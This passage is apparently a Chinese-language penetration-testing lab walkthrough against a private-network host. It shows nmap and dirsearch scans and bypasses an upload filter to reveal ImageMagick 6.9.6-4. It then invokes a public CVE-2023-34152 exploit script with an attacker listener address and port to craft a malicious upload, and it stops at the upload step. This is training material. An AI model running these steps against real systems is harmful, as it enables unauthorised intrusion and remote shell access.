针对服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.168.178
```

![image-20241123151228438](https://s2.loli.net/2024/11/23/mkaOBTHd87wVNXc.png)

针对开放端口进行相应的服务探测

```
sudo nmap -p22,80 -A 192.168.168.178 -oG Image.txt
```

![image-20241123151803916](https://s2.loli.net/2024/11/23/PCDZrYHqipIhatw.png)

针对22端口没有可以直接利用的漏洞，我们优先关注80端口服务具有的相应的服务

我们尝试上传一个test.txt文件内容

![image-20241123152942164](https://s2.loli.net/2024/11/23/Arc6Ll3nd7Rypjh.png)

可以看到只允许上传jpeg和PNG文件

针对目录我们进行相应的目录扫描

```
dirsearch -u http://192.168.168.178/
```

没有扫到相应的结果内容，

![image-20241123154258936](https://s2.loli.net/2024/11/23/W1NvzTO7AbqCLXG.png)

我们尝试修改了下文件后缀名及成功上传了相应文件同时我们可以获取一个版本号

version：6.9.6-4

我们通过搜索关键字：imagemagick 6.9.6-4 exploit，发现相应的漏洞CVE编号为CVE-2023-34152，接着我们搜索CVE-2023-34152 exploit GitHub，发现相应的一个利用脚本

https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152

```
python3 CVE-2023-34152.py -l 192.168.45.227 -p 443
```

利用脚本生成相应的文件后进行上传
